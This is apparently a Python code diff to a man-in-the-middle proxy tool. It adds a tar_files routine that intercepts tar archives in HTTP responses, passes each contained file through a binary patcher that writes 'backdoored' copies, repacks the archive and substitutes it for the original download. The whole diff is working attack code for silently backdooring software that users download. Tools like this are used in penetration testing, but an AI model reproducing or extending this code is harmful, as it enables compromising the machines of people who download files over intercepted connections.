@@ -43,6 +43,9 @@ import sys
 import pefile
 import logging
 import json
+import tarfile
+from cStringIO import StringIO
+import tempfile
 
 try:
     from configobj import ConfigObj
@@ -97,7 +100,10 @@ class proxyMaster(controller.Master):
         self.binaryMimeTypes = (["application/octet-stream"], ['application/x-msdownload'],
                                 ['application/x-msdos-program'], ['binary/octet-stream'],
                                 )
-        #FOR FUTURE USE
+
+        #TODO: find tar and zip files better
+        #XXX: the last one is a temporary hack...
+        self.tarMimeTypes = (['application/x-tar'], ['application/tar'], ['application/octet-stream'])
         self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])
 
         #USED NOW
@@ -110,6 +116,100 @@ class proxyMaster(controller.Master):
 
         except KeyboardInterrupt:
             self.shutdown()
+
+    def tar_files(self, aTarFileBytes):
+        "When called will unpack and edit a Tar File and return a tar file"
+        
+        print "[*] TarFile size:", len(aTarFileBytes) / 1024, 'KB'
+
+        if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
+            print "[!] TarFile over allowed size"
+            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
+            return aTarFileBytes
+
+        tarFileReader = StringIO(aTarFileBytes)
+
+        tarFile = None
+        compressionMode = ''
+        for mode in [':gz', ':bz2', ':']:
+          try:
+              tarFile = tarfile.open(fileobj=tarFileReader, mode='r'+mode)
+              compressionMode = mode
+              break
+          except tarfile.ReadError:
+              pass
+
+        if tarFile is None:
+            print '[!] Not a tar file'
+            return aTarFileBytes
+
+        print '[*] Tar file contents and info:'
+
+        members = tarFile.getmembers()
+        for info in members:
+            print "\t", info.name, info.mtime, info.size
+
+        newTarFileBytes = StringIO()
+        newTarFile = tarfile.open(mode='w'+compressionMode, fileobj=newTarFileBytes)
+
+        patchCount = 0
+        for info in members:
+            print "[*] >>> Next file in tarfile:", info.name
+
+            if not info.isfile():
+                print info.name, 'is not a file'
+                newTarFile.addfile(info, tarFile.extractfile(info))
+                continue
+            
+            # Check against keywords    
+            keywordCheck = False       
+     
+            if type(self.tarblacklist) is str:
+                if self.tarblacklist.lower() in info.name.lower():
+                    keywordCheck = True
+     
+            else:                      
+                for keyword in self.tarblacklist:             
+                    if keyword.lower() in info.name.lower():
+                        keywordCheck = True                   
+                        continue       
+     
+            if keywordCheck is True:   
+                print "[!] Tar blacklist enforced!"           
+                logging.info('Tar blacklist enforced on %s', info.name)
+                continue
+
+            # Try to patch
+            extractedFile = tarFile.extractfile(info)
+            extractedFileBytes = extractedFile.read()
+
+            if patchCount >= int(self.userConfig['TAR']['patchCount']):
+                newTarFile.addfile(info, StringIO(extractedFileBytes))
+            else:
+                # create the file on disk temporarily for fileGrinder to run on it
+                with tempfile.NamedTemporaryFile() as tmp:
+                    tmp.write(extractedFileBytes)
+                    tmp.flush()
+                    patchResult = self.binaryGrinder(tmp.name)
+                    if patchResult:
+                        patchCount += 1
+                        file2 = "backdoored/"+ os.path.basename(tmp.name)
+                        print "[*] Patching complete, adding to tar file."
+                        info.size = os.stat(file2).st_size
+                        with open(file2, 'rb') as f:
+                            newTarFile.addfile(info, f)
+                        logging.info("%s in tar patched, adding to tarfile", info.name)
+                    else:
+                        print "[!] Patching failed"
+                        newTarFile.addfile(info, extractedFile)
+                        logging.info("%s patching failed. Keeping original file in tar.", info.name)
+            if patchCount == int(self.userConfig['TAR']['patchCount']):
+                logging.info("Met Tar config patchCount limit.")
+
+        newTarFile.close()
+        newTarFileBytes.seek(0)
+        return newTarFileBytes.read()
+        
 
     def zip_files(self, aZipFile):
         "When called will unpack and edit a Zip File and return a zip file"
@@ -459,6 +559,7 @@ class proxyMaster(controller.Master):
             self.keysblacklist = self.userConfig['keywords']['blacklist']
             self.keyswhitelist = self.userConfig['keywords']['whitelist']
             self.zipblacklist = self.userConfig['ZIP']['blacklist']
+            self.tarblacklist = self.userConfig['TAR']['blacklist']
 
         except Exception as e:
             print "[!] YOUR CONFIG IS BROKEN:", str(e)
@@ -506,6 +607,9 @@ class proxyMaster(controller.Master):
 
             #print msg.content[:2]
             #print msg.headers
+            if msg.headers['content-type'] in self.tarMimeTypes and self.convert_to_Bool(self.CompressedFiles) is True:
+                    aTarFile = msg.content
+                    msg.content = self.tar_files(aTarFile)
             if msg.headers['content-type'] in self.zipMimeTypes and self.convert_to_Bool(self.CompressedFiles) is True:
                     aZipFile = msg.content
                     msg.content = self.zip_files(aZipFile)
